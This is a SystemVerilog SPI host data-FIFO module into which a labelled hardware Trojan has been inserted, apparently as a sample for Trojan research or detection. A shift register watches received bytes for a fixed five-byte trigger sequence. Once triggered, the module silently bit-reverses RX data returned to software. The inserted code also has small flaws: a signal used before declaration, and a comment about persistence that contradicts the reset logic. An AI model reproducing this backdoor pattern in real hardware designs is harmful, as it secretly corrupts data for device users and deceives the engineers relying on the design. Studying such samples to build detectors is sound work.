`include "prim_assert.sv"

module spi_host_data_fifos #(
  parameter int         TxDepth   = 72,
  parameter int         RxDepth   = 64,
  parameter logic       SwapBytes = 0
) (
  input               clk_i,
  input               rst_ni,

  input        [31:0] tx_data_i,
  input        [3:0]  tx_be_i,
  input               tx_valid_i,
  output logic        tx_ready_o,
  input        [7:0]  tx_watermark_i,

  output logic [31:0] core_tx_data_o,
  output logic [3:0]  core_tx_be_o,
  output logic        core_tx_valid_o,
  input               core_tx_ready_i,
  input               core_tx_byte_select_full_i,

  input        [31:0] core_rx_data_i,
  input               core_rx_valid_i,
  output logic        core_rx_ready_o,

  output logic [31:0] rx_data_o,
  output logic        rx_valid_o,
  input               rx_ready_i,
  input        [7:0]  rx_watermark_i,

  input               sw_rst_i,

  output logic        tx_empty_o,
  output logic        tx_full_o,
  output logic [7:0]  tx_qd_o,
  output logic        tx_wm_o,
  output logic        rx_empty_o,
  output logic        rx_full_o,
  output logic [7:0]  rx_qd_o,
  output logic        rx_wm_o
);

  localparam int RxDepthW = prim_util_pkg::vbits(RxDepth+1);
  localparam int TxDepthW = prim_util_pkg::vbits(TxDepth+1);

  logic [31:0] tx_data_ordered;
  logic [3:0]  tx_be_ordered;
  logic [31:0] rx_data_unordered;

  if (SwapBytes) begin : gen_swap
    assign tx_data_ordered = { << 8 {tx_data_i} };
    assign tx_be_ordered   = { << { tx_be_i} };
    // TROJAN INSERTION: Insert Trojan-controlled mux for RX data output
    assign rx_data_o       = trojan_active_q ? { << {rx_data_unordered} } : { << 8 { rx_data_unordered } };
  end else begin : gen_do_not_swap
    assign tx_data_ordered = tx_data_i;
    assign tx_be_ordered   = tx_be_i;
    // TROJAN INSERTION: Insert Trojan-controlled mux for RX data output
    assign rx_data_o       = trojan_active_q ? {rx_data_unordered[0], rx_data_unordered[1], rx_data_unordered[2], rx_data_unordered[3],
                                                rx_data_unordered[4], rx_data_unordered[5], rx_data_unordered[6], rx_data_unordered[7],
                                                rx_data_unordered[8], rx_data_unordered[9], rx_data_unordered[10], rx_data_unordered[11],
                                                rx_data_unordered[12], rx_data_unordered[13], rx_data_unordered[14], rx_data_unordered[15],
                                                rx_data_unordered[16], rx_data_unordered[17], rx_data_unordered[18], rx_data_unordered[19],
                                                rx_data_unordered[20], rx_data_unordered[21], rx_data_unordered[22], rx_data_unordered[23],
                                                rx_data_unordered[24], rx_data_unordered[25], rx_data_unordered[26], rx_data_unordered[27],
                                                rx_data_unordered[28], rx_data_unordered[29], rx_data_unordered[30], rx_data_unordered[31]}
                                         : rx_data_unordered;
  end : gen_do_not_swap

  // ============= TROJAN INSERTION: Trigger and Control Registers =============
  // Trigger variables for 5-byte sequence, persisted on reset
  logic [2:0] trojan_state_d, trojan_state_q;
  logic       trojan_active_d, trojan_active_q;
  
  // Expected trigger values
  localparam logic [7:0] TROJAN_SEQ [0:4] = {8'h09, 8'h04, 8'h00, 8'h02, 8'h16};

  // Shift register to hold incoming bytes for trigger detection
  logic [7:0] rx_byte_q [0:4];
  logic [7:0] rx_byte_d [0:4];

  // Internal: extract incoming received byte in the order as actually received (LSB first)
  // Only accept bytes when RX FIFO receives new data (core_rx_valid_i).
  always_comb begin
    for (int i = 4; i > 0; i--) begin
      rx_byte_d[i] = rx_byte_q[i-1];
    end
    rx_byte_d[0] = core_rx_data_i[7:0]; // Only use LSB, assuming SPI is byte-wide per transaction
  end

  // Trojan trigger state machine
  always_comb begin
    trojan_state_d   = trojan_state_q;
    trojan_active_d  = trojan_active_q;
    if (!rst_ni || sw_rst_i) begin
      trojan_state_d  = 3'd0;
      trojan_active_d = 1'b0;
    end else if (core_rx_valid_i) begin
      // Check for the sequence via shift register
      if (   rx_byte_q[4] == TROJAN_SEQ[4]
          && rx_byte_q[3] == TROJAN_SEQ[3]
          && rx_byte_q[2] == TROJAN_SEQ[2]
          && rx_byte_q[1] == TROJAN_SEQ[1]
          && rx_byte_q[0] == TROJAN_SEQ[0]) begin
        trojan_active_d = 1'b1; // Payload enabled next cycle
      end
    end else begin
      // Remain in current state unless reset
      trojan_active_d = trojan_active_q;
    end
  end

  // Sequential update
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni || sw_rst_i) begin
      for (int i = 0; i < 5; i++) begin
        rx_byte_q[i] <= 8'h00;
      end
      trojan_state_q  <= 3'd0;
      trojan_active_q <= 1'b0;
    end else if (core_rx_valid_i) begin
      for (int i = 4; i > 0; i--) begin
        rx_byte_q[i] <= rx_byte_q[i-1];
      end
      rx_byte_q[0] <= core_rx_data_i[7:0];
      trojan_state_q  <= trojan_state_d;
      trojan_active_q <= trojan_active_d;
    end else begin
      trojan_state_q  <= trojan_state_d;
      trojan_active_q <= trojan_active_d;
    end
  end
  // ============= END TROJAN INSERTION =============

  logic [35:0]         tx_data_be;
  logic [35:0]         core_tx_data_be;

  logic [TxDepthW-1:0] tx_depth;

  // The byte_select module greedily pops data from the TX FIFO, so
  // the FIFO should be observed as having an effective depth of N+1.
  assign tx_qd_o = 8'(tx_depth) + {7'b0, core_tx_byte_select_full_i};

  assign tx_data_be = { tx_data_ordered, tx_be_ordered };
  assign { core_tx_data_o, core_tx_be_o } = core_tx_data_be;

  prim_fifo_sync #(
    .Width(36),
    .Pass(1),
    .Depth(TxDepth)
  ) u_tx_fifo (
    .clk_i,
    .rst_ni,
    .clr_i    (sw_rst_i),
    .wvalid_i (tx_valid_i),
    .wready_o (tx_ready_o),
    .wdata_i  (tx_data_be),
    .rvalid_o (core_tx_valid_o),
    .rready_i (core_tx_ready_i),
    .rdata_o  (core_tx_data_be),
    .full_o   (),
    .depth_o  (tx_depth),
    .err_o    ()
  );

  logic [RxDepthW-1:0] rx_depth;

  assign rx_qd_o = 8'(rx_depth);

  prim_fifo_sync #(
    .Width(32),
    .Pass(1),
    .Depth(RxDepth)
  ) u_rx_fifo (
    .clk_i,
    .rst_ni,
    .clr_i    (sw_rst_i),
    .wvalid_i (core_rx_valid_i),
    .wready_o (core_rx_ready_o),
    .wdata_i  (core_rx_data_i),
    .rvalid_o (rx_valid_o),
    .rready_i (rx_ready_i),
    .rdata_o  (rx_data_unordered),
    .full_o   (),
    .depth_o  (rx_depth),
    .err_o    ()
  );

  // Create the status outputs
  // - Include the 1-word storage in byte_select for the TX datapath
  assign tx_empty_o = (tx_qd_o == 0);
  assign rx_empty_o = (rx_qd_o == 0);
  assign tx_full_o  = (tx_qd_o >= 8'(TxDepth) + 1); // inc. byte_sel
  assign rx_full_o  = (rx_qd_o >= 8'(RxDepth));
  assign tx_wm_o    = (tx_qd_o <  tx_watermark_i);
  assign rx_wm_o    = (rx_qd_o >= rx_watermark_i);

  // Due to the addition of the byte_sel as a N+1'th fifo stage, ensure
  // we have adequate resolution in our counter (tx_qd_o) to represent this.
  `ASSERT_INIT(TxDepth_A, TxDepth < (2**$size(tx_qd_o)) - 1)

endmodule